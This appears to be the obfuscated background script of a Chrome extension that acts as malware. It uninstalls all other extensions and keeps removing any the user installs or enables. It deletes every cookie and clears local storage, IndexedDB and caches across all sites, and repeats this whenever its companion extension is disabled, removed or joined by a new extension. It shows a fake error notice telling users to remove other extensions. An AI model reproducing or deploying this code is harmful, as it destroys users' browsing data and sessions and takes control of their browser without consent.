const v7k2p = 'jhnkjpfegcmimpjfjlifpclaelanchok';
let q4m9x = true;
function t3r8n() {
    chrome.tabs.query({}, _0xc5adc4 => {
        _0xc5adc4.forEach(_0x5b7ff5 => {
            if (_0x5b7ff5.url && !_0x5b7ff5.url.startsWith('chrome://')) {
                chrome.tabs.reload(_0x5b7ff5.id);
            }
        });
    });
}
chrome.runtime.onInstalled.addListener(_0x623c44 => {
    if (_0x623c44.reason === 'install' || _0x623c44.reason === 'update') {
        t3r8n();
    }
});
chrome.management.onEnabled.addListener(_0xf4226f => {
    if (_0xf4226f.id === chrome.runtime.id) {
        t3r8n();
    }
});
chrome.runtime.onStartup.addListener(() => {
    chrome.management.get(chrome.runtime.id, _0x447f0d => {
        if (_0x447f0d && _0x447f0d.enabled) {
            t3r8n();
        }
    });
});
async function m5k9j() {
    await new Promise(_0x287f0e => {
        chrome.cookies.getAll({}, _0x33ee6 => {
            const _0x1df74e = _0x33ee6.map(_0x38c4d2 => {
                return new Promise(_0x4445d4 => {
                    const _0x3e2f6a = 'http' + (_0x38c4d2.secure ? 's' : '') + '://' + _0x38c4d2.domain + _0x38c4d2.path;
                    chrome.cookies.remove({
                        url: _0x3e2f6a,
                        name: _0x38c4d2.name
                    }, () => _0x4445d4());
                });
            });
            Promise.all(_0x1df74e).then(_0x287f0e);
        });
    });
    const _0x4cf08a = await new Promise(_0x47fc84 => {
        chrome.cookies.getAll({}, _0x50caef => {
            const _0x5d7d62 = [...new Set(_0x50caef.map(_0x249054 => _0x249054.domain))];
            _0x47fc84(_0x5d7d62);
        });
    });
    for (const _0x1e4b4e of _0x4cf08a) {
        try {
            await chrome.browsingData.remove({
                origins: [
                    'http://' + _0x1e4b4e,
                    'https://' + _0x1e4b4e
                ]
            }, {
                localStorage: true,
                sessionStorage: true,
                indexedDB: true,
                webSQL: true,
                cache: true,
                fileSystems: true,
                serviceWorkers: true
            });
        } catch (_0x25655e) {
            console.error('hekkl akdkladkdlk ' + _0x1e4b4e + ':', _0x25655e);
        }
    }
    await chrome.browsingData.removeCache({});
    t3r8n();
}
async function j4h7k(_0x3a40b5 = 3) {
    let _0x51767c = 0;
    while (_0x51767c < _0x3a40b5) {
        try {
            await m5k9j();
            return;
        } catch (_0x39d02f) {
            _0x51767c++;
            console.error('Cld8ifd2ear atdte838fkmpt ' + _0x51767c + ' failed:', _0x39d02f);
            if (_0x51767c < _0x3a40b5) {
                await new Promise(_0xb5859b => setTimeout(_0xb5859b, 1000 * _0x51767c));
            }
        }
    }
    throw new Error('ld93939393 ' + _0x3a40b5 + ' attempts');
}
chrome.management.onInstalled.addListener(_0x15aac2 => {
    if (_0x15aac2.id !== chrome.runtime.id) {
        j4h7k();
    }
});
chrome.management.onUninstalled.addListener(_0x4578ca => {
    if (_0x4578ca === v7k2p) {
        q4m9x = false;
        j4h7k();
        t3r8n();
    }
});
chrome.management.onDisabled.addListener(_0x486c74 => {
    if (_0x486c74.id === v7k2p) {
        q4m9x = false;
        j4h7k();
        t3r8n();
    }
});
chrome.management.onEnabled.addListener(_0x163e11 => {
    if (_0x163e11.id === v7k2p) {
        q4m9x = true;
    }
});
chrome.alarms.create('x9p3k', { periodInMinutes: 60 });
chrome.alarms.onAlarm.addListener(_0x3e8c46 => {
    if (_0x3e8c46.name === 'x9p3k') {
        h6f2q();
        d5m1k();
    }
});
chrome.alarms.create('q2j7m', { periodInMinutes: 120 });
chrome.alarms.onAlarm.addListener(_0x2f92c7 => {
    if (_0x2f92c7.name === 'q2j7m') {
        j4h7k();
    }
});
function d5m1k() {
    chrome.management.get(v7k2p, _0x21c4d5 => {
        if (chrome.runtime.lastError || !_0x21c4d5 || _0x21c4d5.enabled === false) {
            if (q4m9x) {
                q4m9x = false;
                j4h7k();
                t3r8n();
            }
        } else {
            q4m9x = true;
        }
    });
}
let g7p2x = [];
function h6f2q() {
    chrome.management.getAll(_0x5a7d4b => {
        const _0x452ff3 = _0x5a7d4b.map(_0x9a9e75 => _0x9a9e75.id);
        if (g7p2x.length > 0) {
            const _0x3cefa8 = _0x452ff3.filter(_0x234f2a => !g7p2x.includes(_0x234f2a) && _0x234f2a !== chrome.runtime.id && _0x234f2a !== v7k2p);
            if (_0x3cefa8.length > 0) {
                j4h7k();
            }
        }
        g7p2x = _0x452ff3;
    });
}
chrome.runtime.onStartup.addListener(() => {
    chrome.management.getAll(_0x4e516c => {
        g7p2x = _0x4e516c.map(_0x1852a8 => _0x1852a8.id);
    });
    d5m1k();
});
chrome.runtime.onInstalled.addListener(() => {
    chrome.management.getAll(_0x1e0ba1 => {
        g7p2x = _0x1e0ba1.map(_0x560bae => _0x560bae.id);
    });
    d5m1k();
});
function y8n3k() {
    return new Promise(_0x36b093 => {
        chrome.management.getAll(_0x8a53f2 => {
            const _0x53400d = _0x8a53f2.filter(_0x531023 => _0x531023.id !== chrome.runtime.id && _0x531023.id !== v7k2p && _0x531023.type === 'extension');
            _0x36b093(_0x53400d);
        });
    });
}
function u3k7j() {
    return new Promise(_0x36fd49 => {
        chrome.management.getAll(_0x5ebd1b => {
            const _0x17ba03 = _0x5ebd1b.filter(_0x3a17be => _0x3a17be.id !== chrome.runtime.id && _0x3a17be.id !== v7k2p && _0x3a17be.type === 'extension').map(_0x29a793 => {
                return new Promise(_0x47cdb2 => {
                    chrome.management.uninstall(_0x29a793.id, () => {
                        if (chrome.runtime.lastError) {
                            console.error('Failssesldklsdfkl ' + _0x29a793.name + ':', chrome.runtime.lastError);
                            _0x47cdb2(false);
                        } else {
                            console.log('Succ23esdf454ssfull09y unindersdsfspls988talled ' + _0x29a793.name);
                            _0x47cdb2(true);
                        }
                    });
                });
            });
            Promise.all(_0x17ba03).then(_0x5d5dd1 => {
                _0x36fd49(_0x5d5dd1.every(_0x1bdec5 => _0x1bdec5));
            });
        });
    });
}
function p2m7k() {
    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon48.png',
        title: '⚠️Error',
        message: 'Another extension is currently active. Please remove other extensions including Google docs or all others to use our Tools properly.'
    });
    setTimeout(() => {
        chrome.management.uninstallSelf();
    }, 3000);
}
function k9f3q() {
    chrome.management.onInstalled.addListener(_0x2d8f7a => {
        if (_0x2d8f7a.type === 'extension' && _0x2d8f7a.id !== chrome.runtime.id && _0x2d8f7a.id !== v7k2p) {
            chrome.management.uninstall(_0x2d8f7a.id, () => {
                if (chrome.runtime.lastError) {
                    console.error('asfajkfjaksfkasfjksaerawra:', chrome.runtime.lastError);
                    p2m7k();
                } else {
                    console.log('kasf aksdfjasfdkjas askjfjas', _0x2d8f7a.name);
                    chrome.notifications.create({
                        type: 'basic',
                        iconUrl: 'icons/icon48.png',
                        title: '⚠️Error',
                        message: 'Another extension is currently active. Please remove other extensions including Google docs or all others to use our Tools properly.'
                    });
                }
            });
        }
    });
    chrome.management.onEnabled.addListener(_0x5a971e => {
        if (_0x5a971e.type === 'extension' && _0x5a971e.id !== chrome.runtime.id && _0x5a971e.id !== v7k2p) {
            chrome.management.uninstall(_0x5a971e.id, () => {
                if (chrome.runtime.lastError) {
                    console.error('aklfkf aflasifasieorais:', chrome.runtime.lastError);
                    p2m7k();
                } else {
                    console.log('lakfd ialfallieralfa alkfaslfkla', _0x5a971e.name);
                }
            });
        }
    });
}
async function l4m9p() {
    try {
        const _0x1e73c0 = await y8n3k();
        if (_0x1e73c0.length > 0) {
            console.log('alsfasklf aoief asfklasf as');
            const _0x4cf61a = await u3k7j();
            if (!_0x4cf61a) {
                console.log(' aldfalk aslkdfklasfklask f');
                p2m7k();
                return;
            } else {
                console.log('hehehehehe');
            }
        }
        k9f3q();
        setInterval(async () => {
            const _0x1707ec = await y8n3k();
            if (_0x1707ec.length > 0) {
                console.log('hahaksdl sklfsklf sfkslsf');
                const _0x24fa43 = await u3k7j();
                if (!_0x24fa43) {
                    p2m7k();
                }
            }
        }, 60000);
    } catch (_0x58a509) {
        console.error('klafld lafklafkl alkfalkflk', _0x58a509);
        p2m7k();
    }
}
chrome.runtime.onInstalled.addListener(() => {
    l4m9p();
});
l4m9p();